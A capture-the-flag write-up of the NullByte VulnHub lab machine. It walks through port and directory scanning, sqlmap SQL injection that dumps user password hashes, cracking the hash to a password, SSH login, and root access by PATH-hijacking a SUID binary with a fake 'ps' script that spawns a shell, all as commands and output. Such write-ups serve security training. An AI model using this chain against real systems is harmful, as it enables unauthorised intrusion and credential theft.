# NullByte VulnHub Challenge Writeup

## Overview

NullByte is a VulnHub machine that involves network reconnaissance, web enumeration, SQL injection, and privilege escalation through SUID binaries. This writeup details the steps taken to gain root access and retrieve the final flag.

## Reconnaissance

### Network Scanning

First, I identified the target machine on the network using `netdiscover`:

\`\`\`bash
netdiscover -r 192.168.1.0/24
\`\`\`

The target machine was identified at `192.168.1.142` with MAC Address `08:00:27:96:30:FD` (PCS Systemtechnik/Oracle VirtualBox virtual NIC).

### Port Scanning

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:

\`\`\`bash
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.142 -p-
\`\`\`

**Results:**
-   **80/tcp**: `http` Apache httpd 2.4.10 ((Debian))
-   **111/tcp**: `rpcbind` 2-4 (RPC #100000)
-   **777/tcp**: `ssh` OpenSSH 6.7p1 Debian 5 (protocol 2.0)
-   **33624/tcp**: `status` 1 (RPC #100024)

I attempted to connect to port 33624 using `nc`, but it did not yield any immediate useful information.

\`\`\`bash
nc 192.168.1.142 33624
\`\`\`

## Web Enumeration

I used `gobuster` to enumerate directories and files on the web server running on port 80.

### Directory Enumeration

\`\`\`bash
gobuster dir -u http://192.168.1.142/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
\`\`\`

**Results:**
-   `/uploads` (Status: 301)
-   `/javascript` (Status: 301)
-   `/phpmyadmin` (Status: 301)
-   `/server-status` (Status: 403)

I also ran `gobuster` with a common wordlist:

\`\`\`bash
gobuster dir -u http://192.168.1.142/ -w ../../wordlists/common.txt
\`\`\`

This confirmed the previous findings and added `/index.html`.

### File Enumeration

\`\`\`bash
gobuster dir -u http://192.168.1.142/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
\`\`\`

**Results:**
-   `/index.html` (Status: 200)
-   Other files like `.htaccess`, `.htpasswd` returned 403 Forbidden.

### Enumerating `/uploads` Directory

I then focused on the `/uploads` directory:

\`\`\`bash
gobuster dir -u http://192.168.1.142/uploads/ -w ../../wordlists/common.txt
\`\`\`

This revealed `/uploads/index.html` (Status: 200). Further enumeration with `directory-list-2.3-medium.txt` on `/uploads` did not reveal new directories.

## File Analysis

I noticed a `main.gif` file in my current directory. I performed some analysis on it.

### Strings Analysis

\`\`\`bash
strings main.gif | head
\`\`\`
\`\`\`bash
strings main.gif | head -n 50
\`\`\`
\`\`\`bash
strings main.gif | tail -n 30
\`\`\`

The `strings` command revealed a peculiar string: `P-): kzMb5nVYJw`. This looked like a potential key or hidden path.

### Binwalk and Exiftool

\`\`\`bash
binwalk main.gif
\`\`\`
\`\`\`bash
exiftool main.gif
\`\`\`

`exiftool` confirmed the `Comment` field contained `P-): kzMb5nVYJw`. This strongly suggested it was a hidden directory or parameter.

## Web Exploitation - SQL Injection

Based on the `kzMb5nVYJw` string, I tried navigating to `http://192.168.1.142/kzMb5nVYJw/`. This directory contained an `index.php` file.

### Brute-forcing the Key

The screenshot `bruteforce-elite.png` shows a Python script being used to brute-force a key for `index.php`. The script successfully found the key `elite`.

<img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot_2025-07-12_06-36-26-1OYHOEb9yHeoaVns8Bt0Jp65SDuBeZ.png" alt="Python script brute-forcing key to 'elite'" width="800" />

This implies that `index.php` likely takes a `key` parameter. I tested this with `sqlmap`.

### SQLMap on `index.php`

I attempted to use `sqlmap` on `http://192.168.1.142/kzMb5nVYJw/index.php` with a POST request, providing `key=test` as data.

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/index.php" --data="key=test" --batch --level=5 --risk=3
\`\`\`

`sqlmap` reported that the POST parameter 'key' did not appear to be injectable. This means the `index.php` page itself might not be vulnerable to SQL injection via the `key` parameter.

### SQLMap on `420search.php`

Further investigation (or perhaps navigating the web application) would reveal `420search.php` within the `kzMb5nVYJw` directory. This page likely takes a `usrtosearch` GET parameter. I tested this with `sqlmap`.

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --level=5 --risk=3
\`\`\`

**Results:**
`sqlmap` successfully identified multiple injection points for the `usrtosearch` GET parameter, including:
-   Boolean-based blind
-   Error-based
-   Time-based blind
-   UNION query (3 columns)

The backend DBMS was identified as **MySQL >= 5.5** running on **Linux Debian 8 (jessie)** with **Apache 2.4.10**.

### Enumerating Databases

I used `sqlmap` to list the available databases:

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --dbs
\`\`\`

**Available Databases:**
-   `information_schema`
-   `mysql`
-   `performance_schema`
-   `phpmyadmin`
-   `seth`

The `seth` database looked promising.

### Enumerating Tables in `seth` Database

I enumerated tables within the `seth` database:

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --tables -D seth
\`\`\`

**Table in `seth` database:**
-   `users`

### Dumping Data from `seth.users`

I dumped the data from the `users` table in the `seth` database:

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --dump -D seth -T users
\`\`\`

**Dumped Data:**
\`\`\`
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
\`\`\`

We obtained a hash for the user `ramses`: `YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`.

### Enumerating `phpmyadmin` Database (Optional)

I also checked the `phpmyadmin` database for tables, but it didn't yield immediately useful credentials.

\`\`\`bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=root" --batch --tables -D phpmyadmin
\`\`\`

## Password Cracking

I saved the hash for `ramses` to a file and used `hashid` to identify its type, then `john` to crack it.

\`\`\`bash
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" > hash.txt
hashid "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE"
\`\`\`

`hashid` initially suggested "Cisco-IOS(SHA-256)" and "Cisco Type 4". However, the hash format `YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE` looks like a Base64 encoded string.

Decoding the Base64 string:
\`\`\`bash
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64 -d
\`\`\`
Result: `c6d6bd7ebf806f43c76acc3681703b81`

Now, identifying the type of the decoded hash:
\`\`\`bash
hashid "c6d6bd7ebf806f43c76acc3681703b81"
\`\`\`
This hash was identified as MD5, among others.

I then used `john` with the `rockyou.txt` wordlist to crack the MD5 hash:

\`\`\`bash
echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

The hash `c6d6bd7ebf806f43c76acc3681703b81` was successfully cracked to `omega`.

<img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot_2025-07-12_06-41-46-UT72poggITCW2jo37TIowTrmREEnNU.png" alt="CrackStation cracking MD5 hash to 'omega'" width="800" />

**Credentials:**
-   **User**: `ramses`
-   **Password**: `omega`

## SSH Access

I attempted to SSH into the machine as `ramses` using the cracked password. The `nmap` scan showed SSH running on port 777, not the default port 22.

\`\`\`bash
ssh ramses@192.168.1.142 -p 777
\`\`\`

I successfully logged in as `ramses`.

### Initial Enumeration as `ramses`

Once logged in, I checked the current directory and tried to use `sudo -l`:

\`\`\`bash
ramses@NullByte:~$ ls -la
\`\`\`
\`\`\`bash
ramses@NullByte:~$ sudo -l
[sudo] password for ramses:
Sorry, user ramses may not run sudo on NullByte.
\`\`\`

The `sudo -l` command indicated that `ramses` cannot run `sudo`.

I checked the `.bash_history` for clues:

\`\`\`bash
ramses@NullByte:~$ cat .bash_history
\`\`\`

The history showed some interesting commands, including `cd /var/www`, `cd backup/`, `ls`, `./procwatch`, `sudo -s`. This suggested that `/var/www/backup/procwatch` might be an interesting file.

## Privilege Escalation

### Identifying SUID Binaries

I searched for SUID binaries on the system:

\`\`\`bash
find / -perm -4000 2> /dev/null
\`\`\`

**Key finding:**
-   `/var/www/backup/procwatch`

I checked the permissions of `procwatch`:

\`\`\`bash
ls -la /var/www/backup/procwatch
\`\`\`
\`\`\`
-rwsr-xr-x 1 root root 4932 Aug  2  2015 /var/www/backup/procwatch
\`\`\`

The `s` permission bit (`-rws`) indicates that `procwatch` is a SUID binary, meaning it runs with the permissions of its owner (`root`).

### Exploiting `procwatch`

When `procwatch` is executed, it seems to run `ps` command. This is a classic scenario for PATH hijacking. If we can control the `PATH` environment variable, we can make `procwatch` execute our own `ps` script instead of the legitimate `/bin/ps`.

1.  **Create a malicious `ps` script:**
    I created a file named `ps` in the `/var/www/backup/` directory (or any directory writable by `ramses` that can be added to `PATH`).

    \`\`\`bash
    ramses@NullByte:/var/www/backup$ vi ps
    \`\`\`

    Content of `ps`:
    \`\`\`bash
    #!/bin/sh
    /bin/sh
    \`\`\`

    This script simply executes `/bin/sh`, which should give us a shell.

2.  **Make the script executable:**
    \`\`\`bash
    ramses@NullByte:/var/www/backup$ chmod +x ps
    \`\`\`

3.  **Modify `PATH` and execute `procwatch`:**
    I added the current directory (`/var/www/backup`) to the `PATH` environment variable so that our malicious `ps` script would be found before `/bin/ps`.

    \`\`\`bash
    ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
    ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch
    \`\`\`

    Upon executing `procwatch`, it ran our `ps` script, which in turn executed `/bin/sh`, granting us a root shell!

    \`\`\`
    # id
    uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
    \`\`\`

    The `euid=0(root)` confirms that we have successfully escalated privileges to root.

## Root Flag

Finally, I navigated to the `/root` directory to find the `proof.txt` file.

\`\`\`bash
# cd /root
# ls
proof.txt
# cat proof.txt
\`\`\`

**Root Flag:** `adf11c7a9e6523e630aaf3b9b7acb51d`

The `proof.txt` also contained a message:
\`\`\`
It seems that you have pwned the box, congrats. Now you done that I wanna talk with you. Write a walk & mail atxly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com
USE THIS PGP PUBLIC KEY
-----BEGIN PGP PUBLIC KEY BLOCK-----
... (PGP key content) ...
-----END PGP PUBLIC KEY BLOCK-----
\`\`\`

## Conclusion

The NullByte challenge was a great exercise in common penetration testing techniques, including network and web enumeration, SQL injection to extract credentials, and a classic PATH hijacking vulnerability for privilege escalation.
